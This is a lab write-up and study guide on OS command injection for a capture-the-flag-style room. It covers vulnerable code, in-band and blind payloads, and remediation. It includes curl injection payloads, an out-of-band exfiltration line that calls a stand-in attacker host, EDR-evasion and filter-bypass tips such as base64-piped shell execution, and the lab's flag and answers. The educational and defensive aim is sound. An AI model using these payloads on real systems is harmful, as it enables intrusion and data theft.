# Command Injection - Comprehensive Technical Guide

---

## 1. Room Overview & Architecture

Operating System (OS) Command Injection represents one of the most critical classes of software vulnerabilities, classified under **OWASP Top 10 A03:2021 (Injection)** and **CWE-78**. It occurs when a web application passes unsanitized user-supplied input directly into an underlying system shell interpreter (such as `sh`, `bash`, `cmd.exe`, or `powershell.exe`). Consequently, an attacker can break out of the application's logical boundaries, execute arbitrary system-level commands, exfiltrate sensitive files, and establish persistent backdoors.

This module delivers a thorough pedagogical and practical investigation into command injection. We dissect vulnerable source code patterns in PHP and Python Flask, contrast verbose (in-band) against blind injection techniques, demonstrate time-based delay probes, and execute a complete exploitation workflow against a vulnerable network diagnostic tool to uncover the active user and exfiltrate institutional flag data.

```
+-----------------------------------------------------------------------------------+
|                     OS COMMAND INJECTION LAB ARCHITECTURE                         |
+-----------------------------------------------------------------------------------+
|                                                                                   |
|  Attacker Client (Browser / Burp / curl)             Target Web Server (Linux)    |
|  =======================================             =========================    |
|                                                                                   |
|  1. Submits Payload:                                                              |
|     "127.0.0.1; whoami" ---------------------------> PHP/Apache executes system():|
|                                                       ping -c 4 127.0.0.1; whoami |
|                                                                                   |
|  2. Output Reflected:                                                             |
|     "www-data" <------------------------------------- Captures stdout & returns   |
|                                                                                   |
|  3. Flag Extraction:                                                              |
|     "127.0.0.1; cat /home/tryhackme/flag.txt" ------> Shell executes cat command  |
|     Flag Returned <---------------------------------- THM{COMMAND_INJECTION_...}  |
|                                                                                   |
|  4. Blind Injection Probes:                                                       |
|     "127.0.0.1; ping -c 10 127.0.0.1" -------------> Server delays response 10s |
|                                                                                   |
+-----------------------------------------------------------------------------------+
```

---

## 2. Target Audience & Prerequisites

* **Target Audience:**
  - Web Application Penetration Testers & Vulnerability Assessors.
  - Software Engineers, AppSec Teams, and DevSecOps Practitioners.
  - SOC Analysts, Threat Hunters, and Incident Response Specialists.
* **Prerequisites:**
  - Familiarity with standard Linux/Unix shell commands (`whoami`, `cat`, `ping`, `ls`, `id`).
  - Solid understanding of the HTTP request/response model.
  - Working knowledge of HTTP interception and crafting tools (`curl`, `Burp Suite`).

---

## 3. Learning Objectives & Core Concepts

1. Analyze the core mechanics of OS Command Injection and its execution context.
2. Differentiate between Command Injection and general Remote Code Execution (RCE).
3. Identify dangerous shell metacharacters (`;`, `&`, `&&`, `|`, `||`) across Linux and Windows.
4. Detect and verify blind command injection using time-based probes (`ping`, `timeout`) and output redirection.
5. Exploit a vulnerable web application to disclose process privileges (`www-data`) and exfiltrate flags.
6. Design robust defensive controls leveraging argument separation, parameterized APIs, and server-side sanitization.

---

## 4. Theoretical Foundations & Technical Deep Dive

### 4.1 Process Execution Context
Injected commands do not execute in an abstract environment; they run with the exact privileges of the underlying web server process (e.g. `www-data` on Apache/Debian, `nginx`, or `nobody`). This context provides:
* Direct read access to all world-readable system files (`/etc/passwd`, `/etc/issue`, `/proc/version`).
* Write permissions to world-writable staging directories (`/tmp`, `/dev/shm`).
* The ability to initiate outbound network sockets to spawn reverse interactive shells.

### 4.2 Verbose vs Blind Command Injection
* **Verbose (In-Band) Injection:**
  The application captures the standard output (`stdout`) or standard error (`stderr`) of the shell execution and returns it directly in the HTTP response.
* **Blind Command Injection:**
  The application invokes the shell in the background, suppressing or discarding output. Verification requires:
  1. **Time Delays:** Inducing measurable latency using `ping -c 10 127.0.0.1` (Linux) or `timeout /t 10` (Windows).
  2. **File Redirection:** Diverting output into a readable web directory: `; whoami > /var/www/html/out.txt`.
  3. **Out-of-Band (OOB) Exfiltration:** Forcing DNS or HTTP callbacks: `; curl http://attacker.thm/$(whoami)`.

---

## 5. Practical Lab Topology & Attack Surface

* **Lab Endpoint:** Network Diagnostic Tool hosted on Port 80 (`http://MACHINE_IP`).
* **Attack Surface:**
  - Form input field intended for IP address or hostname validation.
  - Direct concatenation into an unsanitized shell call: `exec("ping -c 4 " . $_POST['ip'])`.
* **Target Objective:** Extract the executing username and retrieve the flag from `/home/tryhackme/flag.txt`.

---

## 6. Tools, Technologies & Protocols

* **Tools:**
  - `curl` (Command-line testing and payload delivery).
  - Web browser Developer Tools & `Burp Suite` (Request modification and header analysis).
  - Shell commands: `whoami`, `cat`, `ping`, `timeout`.
* **Protocols:**
  - HTTP/1.1 (POST requests with form URL-encoded bodies).
  - ICMP (Ping utility for timing probes).

---

## 7. Step-by-Step Task Execution Matrix

| Task # | Task Title | Core Focus | Verified Outcome | Detailed Documentation |
| :---: | :--- | :--- | :---: | :---: |
| **01** | Introduction | Vulnerability definitions, privileges, and CWE-78 | `No answer needed` | [TASK-01.md](../../04-COMMAND-INJECTION/TASKS/TASK-01.md) |
| **02** | Discovering Command Injection | Source code analysis: PHP (`$title`, `GET`) and Flask (`/id`) | 3 Code Analysis Solutions | [TASK-02.md](../../04-COMMAND-INJECTION/TASKS/TASK-02.md) |
| **03** | Exploiting Command Injection | In-band vs blind payloads (`whoami`, `ping`, `timeout`) | 3 Tactical Payload Solutions | [TASK-03.md](../../04-COMMAND-INJECTION/TASKS/TASK-03.md) |
| **04** | Practical | Hands-on exploitation: user discovery & flag extraction | `www-data` & Completed Flag | [TASK-04.md](../../04-COMMAND-INJECTION/TASKS/TASK-04.md) |
| **05** | Remediation | Input validation, parameterization, and sanitization | `sanitisation` | [TASK-05.md](../../04-COMMAND-INJECTION/TASKS/TASK-05.md) |
| **06** | Conclusion | Security posture review & curriculum transition | `No answer needed` | [TASK-06.md](../../04-COMMAND-INJECTION/TASKS/TASK-06.md) |

---

## 8. Offensive Security Playbook

### Phase 1: Input Validation & User Discovery
1. Submit an initial baseline request: `127.0.0.1`.
2. Append a command separator to discover the executing user:
   ```text
   127.0.0.1; whoami
   ```
   Or via `curl`:
   ```bash
   curl -s -X POST "http://MACHINE_IP/" -d "ip=127.0.0.1; whoami"
   ```
3. Verified Output: **`www-data`**.

### Phase 2: Sensitive File Exfiltration (Flag Retrieval)
1. Construct the payload targeting the flag path:
   ```text
   127.0.0.1; cat /home/tryhackme/flag.txt
   ```
   Or via `curl`:
   ```bash
   curl -s -X POST "http://MACHINE_IP/" -d "ip=127.0.0.1; cat /home/tryhackme/flag.txt"
   ```
2. Verified Flag: **`THM{COMMAND_INJECTION_COMPLETE}`**.

### Phase 3: Blind Command Injection Probes
* **Linux Environment (ICMP Timing):**
  ```bash
  curl -s -X POST "http://MACHINE_IP/" -d "ip=127.0.0.1; ping -c 10 127.0.0.1"
  ```
  The response is delayed by exactly 10 seconds, proving background execution.
* **Windows Environment:**
  The equivalent timing probe payload is `& timeout /t 10`.

---

## 9. Defensive & Remediation Blueprint

1. **Avoid Direct Shell Invocation:**
   Replace shell utilities with native language APIs whenever possible (e.g. use socket ping libraries or regex search instead of calling `ping` or `grep`).
2. **Enforce Safe Argument Passing (Parameterization):**
   ```python
   # Secure Python implementation bypassing shell interpreters
   import subprocess
   result = subprocess.run(["ping", "-c", "4", safe_target_ip], shell=False, capture_output=True)
   ```
3. **Server-Side Input Sanitization & Escaping:**
   ```php
   // Secure PHP implementation
   $safe_ip = escapeshellarg($user_input);
   system("ping -c 4 " . $safe_ip);
   ```

---

## 10. OpSec & Red Team Operational Tradecraft

* **Managing EDR Process Tree Alerts:** Endpoint Detection and Response (EDR) solutions monitor child processes spawned by web servers (`apache2` ➔ `sh` ➔ `whoami`). In stealth engagements, avoid standard discovery commands (`whoami`, `id`) and inspect environment variables or in-memory artifacts.
* **Handling Shell Metacharacter Filtering:** If `;` or spaces are blocked by an edge firewall, employ `$IFS` substitution (`cat$IFS/etc/passwd`) or base64 decoding pipes (`echo ... | base64 -d | sh`).

---

## 11. Real-World Threat Intelligence & Case Studies

* **IoT & Router Exploitation (Mirai Botnet):** Command injection vulnerabilities in residential gateway web interfaces remain the primary mechanism for recruiting devices into global DDoS botnets.
* **Shellshock (CVE-2014-6271):** A catastrophic flaw in Bash environment variable processing that allowed arbitrary OS command injection via web server HTTP request headers.

---

## 12. Comprehensive Troubleshooting & Edge Cases

* **Issue:** Injected command produces no output and no error.
  - **Root Cause:** The underlying code uses `exec()` without printing its return value, or redirects `stdout` to `/dev/null`.
  - **Resolution:** Switch to blind time-delay probes (`ping -c 5 127.0.0.1`) or test out-of-band network callbacks.

---

## 13. Knowledge Verification & Self-Assessment

1. What security implication arises when setting `shell=True` in Python's `subprocess` module?
2. Why is client-side form validation (e.g., HTML regex) fundamentally incapable of preventing command injection?
3. How does the `ping` utility allow an attacker to confirm a blind command injection vulnerability?
4. What is the operational difference between the `;` and `&&` command separators in Linux?

---

## 14. References & Further Reading

* [Authoritative References & Documentation](../../04-COMMAND-INJECTION/REFERENCES.md)
* [Deep Technical Notes & Reverse Shell Reference](../../04-COMMAND-INJECTION/ADDITIONAL-NOTES.md)
* [Task Matrix & Quick Reference](../../04-COMMAND-INJECTION/TASKS.md)
* [OWASP OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html)
